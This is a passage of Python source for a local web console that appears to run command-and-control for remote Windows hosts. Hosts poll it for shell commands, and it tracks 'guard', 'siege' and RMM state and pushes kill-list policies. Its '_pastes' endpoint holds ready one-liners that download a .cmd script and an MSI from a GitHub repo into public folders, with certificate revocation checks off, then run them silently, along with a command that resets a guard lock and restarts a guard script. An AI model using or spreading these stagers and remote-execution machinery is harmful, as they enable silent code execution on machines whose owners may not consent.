        host = (q.get("host") or [""])[0][:64]
        con = db()
        if host and tag:
            con.execute("DELETE FROM host_tags WHERE host=? AND tag=?", (host, tag))
        elif tag:
            con.execute("DELETE FROM host_tags WHERE tag=?", (tag,))
            con.execute("DELETE FROM tags WHERE name=?", (tag,))
        con.commit()
        con.close()
        self._json({"ok": True})

    def _post_maint(self) -> None:
        f = self._fields()
        host = str(f.get("host", "")).strip()[:64]
        on = 1 if str(f.get("on", "1")) in ("1", "true", "True") else 0
        if not host:
            return self._json({"error": "host"}, 400)
        con = db()
        con.execute(
            """INSERT INTO hosts(host,state,streak,extkill,guard,siege,suspects,rmm,last_seen,maint)
               VALUES(?,?,0,0,'?','','','',?,?)
               ON CONFLICT(host) DO UPDATE SET maint=excluded.maint""",
            (host, "?", time.time(), on),
        )
        con.commit()
        con.close()
        # push flag via job
        flag = (
            r">C:\ProgramData\WinRTCS\maint.flag echo 1"
            if on
            else r"del /f /q C:\ProgramData\WinRTCS\maint.flag"
        )
        queue_cmd(host, flag + " & echo MAINT_SET")
        audit("admin", "maint", f"{host}={on}")
        self._json({"ok": True, "host": host, "maint": on})

    def _promote_suspect(self) -> None:
        f = self._fields()
        note = str(f.get("note", "promoted from suspect")).strip()[:200]
        patterns: list[str] = []
        if f.get("pattern"):
            patterns.append(str(f["pattern"]).strip()[:200])
        for item in f.get("suspects") or []:
            blob = (
                str(item.get("suspects", ""))
                if isinstance(item, dict)
                else str(item)
            ).strip()
            for part in re.split(r"[;,\s]+", blob):
                p = part.strip()[:200]
                if p and p.lower() != "none":
                    patterns.append(p)
        # unique preserve order
        seen: set[str] = set()
        uniq: list[str] = []
        for p in patterns:
            if p not in seen:
                seen.add(p)
                uniq.append(p)
        if not uniq:
            return self._json({"error": "pattern or suspects required"}, 400)
        con = db()
        pids = []
        now = time.time()
        for pattern in uniq:
            cur = con.execute(
                "INSERT INTO policy(ts,kind,pattern,action,scope,note) VALUES(?,?,?,?,?,?)",
                (now, "match", pattern, "remove", "ALL", note),
            )
            pids.append(cur.lastrowid)
        con.commit()
        con.close()
        audit("admin", "suspect_promote", f"{uniq} -> policy {pids}")
        self._json(
            {
                "ok": True,
                "policy_ids": pids,
                "patterns": uniq,
                "hint": "Also add match|pattern|note to winrtcs_killlist.cfg and push for HuntKiller.",
            }
        )

    # -------- JSON GETs --------
    def _api_cmds(self) -> None:
        con = db()
        cmds = con.execute(
            "SELECT id, ts, target, cmd FROM cmds ORDER BY id DESC LIMIT 50"
        ).fetchall()
        res = con.execute(
            "SELECT cmd_id, host, rc, ts, length(out) FROM results ORDER BY ts DESC"
        ).fetchall()
        jobs = {
            r[0]: r[1]
            for r in con.execute("SELECT cmd_id, name FROM jobs WHERE cmd_id IS NOT NULL")
        }
        con.close()
        byid: dict[int, list] = {}
        for cid, host, rc, ts, olen in res:
            byid.setdefault(cid, []).append(
                {"host": host, "rc": rc, "ts": ts, "out_len": olen}
            )
        self._json(
            {
                "cmds": [
                    {
                        "id": cid,
                        "ts": ts,
                        "target": target,
                        "cmd": cmd[:200],
                        "job": jobs.get(cid),
                        "results": sorted(byid.get(cid, []), key=lambda x: x["host"]),
                    }
                    for cid, ts, target, cmd in cmds
                ]
            }
        )

    def _api_cmd_detail(self, cid: int) -> None:
        con = db()
        row = con.execute(
            "SELECT id, ts, target, cmd FROM cmds WHERE id=?", (cid,)
        ).fetchone()
        if not row:
            con.close()
            return self._json({"error": "not found"}, 404)
        res = con.execute(
            "SELECT host, ts, rc, out FROM results WHERE cmd_id=? ORDER BY host", (cid,)
        ).fetchall()
        job = con.execute(
            "SELECT name, params, status FROM jobs WHERE cmd_id=?", (cid,)
        ).fetchone()
        con.close()
        self._json(
            {
                "id": row[0],
                "ts": row[1],
                "target": row[2],
                "cmd": row[3],
                "job": {"name": job[0], "params": job[1], "status": job[2]} if job else None,
                "results": [{"host": h, "ts": t, "rc": rc, "out": o} for h, t, rc, o in res],
            }
        )

    def _jobs_status(self) -> None:
        con = db()
        rows = con.execute(
            """SELECT id,ts,name,target,status,attempts,max_attempts,cmd_id,updated
               FROM jobs ORDER BY id DESC LIMIT 80"""
        ).fetchall()
        con.close()
        self._json(
            {
                "jobs": [
                    {
                        "id": i,
                        "ts": t,
                        "name": n,
                        "target": tgt,
                        "status": st or "queued",
                        "attempts": a,
                        "max_attempts": m,
                        "cmd_id": c,
                        "updated": u,
                    }
                    for i, t, n, tgt, st, a, m, c, u in rows
                ]
            }
        )

    def _api_policy(self) -> None:
        con = db()
        rows = con.execute(
            "SELECT id,ts,kind,pattern,action,scope,note FROM policy ORDER BY id DESC"
        ).fetchall()
        con.close()
        self._json(
            {
                "policy": [
                    {
                        "id": i,
                        "ts": t,
                        "kind": k,
                        "pattern": p,
                        "action": a,
                        "scope": s,
                        "note": n,
                    }
                    for i, t, k, p, a, s, n in rows
                ]
            }
        )

    def _api_audit(self) -> None:
        con = db()
        rows = con.execute(
            "SELECT id,ts,actor,action,detail FROM audit ORDER BY id DESC LIMIT 200"
        ).fetchall()
        con.close()
        self._json(
            {
                "audit": [
                    {"id": i, "ts": t, "actor": a, "action": act, "detail": d}
                    for i, t, a, act, d in rows
                ]
            }
        )

    def _api_tags(self) -> None:
        con = db()
        tags = con.execute("SELECT name, note FROM tags ORDER BY name").fetchall()
        ht = con.execute("SELECT host, tag FROM host_tags ORDER BY host").fetchall()
        con.close()
        by_tag: dict[str, list[str]] = {n: [] for n, _ in tags}
        for h, t in ht:
            by_tag.setdefault(t, []).append(h)
        self._json(
            {
                "tags": [
                    {"name": n, "note": note, "hosts": by_tag.get(n, [])}
                    for n, note in tags
                ],
                "host_tags": [{"host": h, "tag": t} for h, t in ht],
            }
        )

    def _rmm_history(self) -> None:
        con = db()
        rows = con.execute(
            "SELECT id,ts,host,rmm FROM rmm_hist ORDER BY id DESC LIMIT 200"
        ).fetchall()
        # also current vs prev
        cur = con.execute(
            "SELECT host,rmm,rmm_prev,last_seen FROM hosts WHERE rmm_prev IS NOT NULL AND rmm_prev!='' ORDER BY host"
        ).fetchall()
        con.close()
        self._json(
            {
                "history": [
                    {"id": i, "ts": t, "host": h, "rmm": r} for i, t, h, r in rows
                ],
                "diffs": [
                    {"host": h, "rmm": r, "prev": p, "last_seen": ls}
                    for h, r, p, ls in cur
                    if (p or "") != (r or "")
                ],
            }
        )

    def _pastes(self) -> None:
        self._json(
            {
                "pastes": [
                    {
                        "name": "Quick (Public) — preferred",
                        "cmd": 'curl.exe -L --ssl-no-revoke -o C:\\Users\\Public\\wq.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_q.cmd && C:\\Users\\Public\\wq.cmd',
                    },
                    {
                        "name": "Quick (Temp)",
                        "cmd": 'curl.exe -L --ssl-no-revoke -o %TEMP%\\wq.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_q.cmd && %TEMP%\\wq.cmd',
                    },
                    {
                        "name": "Gryxa MSI (GitHub)",
                        "cmd": 'powershell -NoP -NonI -C "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile(\'https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi\',\'C:\\Users\\Public\\gryxa.msi\')" & start "" /min msiexec /i C:\\Users\\Public\\gryxa.msi /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress',
                    },
                    {
                        "name": "Force guard gate",
                        "cmd": r'>C:\ProgramData\WinRTCS\guard.cnt echo 9999 & >C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15 & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd & start "" /min cmd /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd',
                    },
                ]
            }
        )

    # -------- legacy map/cmd --------
    def _get_map(self) -> None:
        data = fleet_payload()
        lines = ["%-24s %-10s %-18s %-7s %-9s %s" % ("HOST", "PRESENCE", "STATE", "GUARD", "BEAT", "RMM")]
        for h in data["hosts"]:
            lines.append(
                "%-24s %-10s %-18s %-7s %-9s %s"
                % (
                    h["host"],
                    h["presence"],
                    h["state"],
                    h["guard"],
                    h["beat"],
                    (h["rmm"] or "-")[:70],
                )
            )
        self._text("\n".join(lines))

    def _get_poll(self, q: dict) -> None:
        host = (q.get("host", [""])[0])[:64]
        if not host:
            return self._text("none")
        con = db()
        row = con.execute(
            """SELECT id FROM cmds WHERE ts > ? AND (target = ? OR target = 'ALL')
               AND id NOT IN (SELECT cmd_id FROM results WHERE host = ?)
               ORDER BY id LIMIT 1""",
            (time.time() - CMD_MAX_AGE, host, host),
        ).fetchone()
        if row:
            con.execute(
                "UPDATE jobs SET status='running', updated=? WHERE cmd_id=?",
                (time.time(), row[0]),
            )
            con.commit()
        con.close()
        self._text(str(row[0]) if row else "none")

    def _get_cmd(self, q: dict) -> None:
        host = (q.get("host", [""])[0])[:64]
        try:
            cid = int(q.get("id", ["0"])[0])
        except ValueError:
            cid = 0
        con = db()
        row = con.execute("SELECT target, cmd FROM cmds WHERE id = ?", (cid,)).fetchone()
        con.close()
        if not row or (row[0] != host and row[0] != "ALL"):
            return self._text("", 404)
        self._text(row[1])

    def _get_cmdlist(self) -> None:
        con = db()
        cmds = con.execute(
            "SELECT id, ts, target, cmd FROM cmds ORDER BY id DESC LIMIT 20"
        ).fetchall()
        res = con.execute(
            "SELECT cmd_id, host, rc, ts FROM results ORDER BY ts DESC"
        ).fetchall()
        con.close()
        byid: dict[int, list] = {}
        for cid, host, rc, ts in res:
            byid.setdefault(cid, []).append((host, rc, ts))
        lines = []
        for cid, ts, target, cmd in cmds:
            when = time.strftime("%m-%d %H:%M", time.gmtime(ts))
            lines.append(f"#{cid} [{when} UTC] -> {target}: {cmd[:90]}")
            for host, rc, rts in sorted(byid.get(cid, [])):
                rwhen = time.strftime("%H:%M", time.gmtime(rts))
                lines.append(f"    {host}  {rc}  ({rwhen})")
        self._text("\n".join(lines) if lines else "(no commands yet)")


def silence_watchdog() -> None:
    while True:
        time.sleep(300)
        try:
            con = db()
            rows = con.execute(
                "SELECT host,state,last_seen,last_beat,last_alert,maint FROM hosts"
            ).fetchall()
            now = time.time()
            for h, s, ts, beat, la, maint in rows:
                if maint:
                    continue
                ref = beat or ts or 0
                # SLA warning
                if now - ref > SLA_WARN_SECS and now - ref < SILENCE_SECS:
                    if now - (la or 0) > SLA_WARN_SECS:
                        alert(fmt_sla(h, (now - ref) / 60))
                        con.execute(
                            "UPDATE hosts SET last_alert=? WHERE host=?", (now, h)
                        )
                if now - ref > SILENCE_SECS and now - (la or 0) > SILENCE_RESEND:
                    alert(fmt_silent(h, s, (now - ref) / 3600))
                    con.execute(
                        "UPDATE hosts SET last_alert=? WHERE host=?", (now, h)
                    )
            # job retries
            due = con.execute(
                """SELECT id, name, target, params, attempts, max_attempts FROM jobs
                   WHERE status='queued' AND next_retry>0 AND next_retry<=? AND attempts<max_attempts""",
                (now,),
            ).fetchall()
            for jid, name, target, params, attempts, max_a in due:
                try:
                    p = json.loads(params or "{}")
                    body = render_job(name, p)
                except Exception:
                    continue
                cur = con.execute(
                    "INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)",
                    (now, target, body[:4000]),
                )
                cid = cur.lastrowid
                con.execute(
                    """UPDATE jobs SET cmd_id=?, attempts=?, status='queued', next_retry=0, updated=?
                       WHERE id=?""",
                    (cid, attempts + 1, now, jid),
                )
            con.commit()
            con.close()
        except Exception:
            pass


if __name__ == "__main__":
    threading.Thread(target=silence_watchdog, daemon=True).start()
    threading.Thread(target=alert_flusher, daemon=True).start()
    ThreadingHTTPServer(("127.0.0.1", 8077), H).serve_forever()
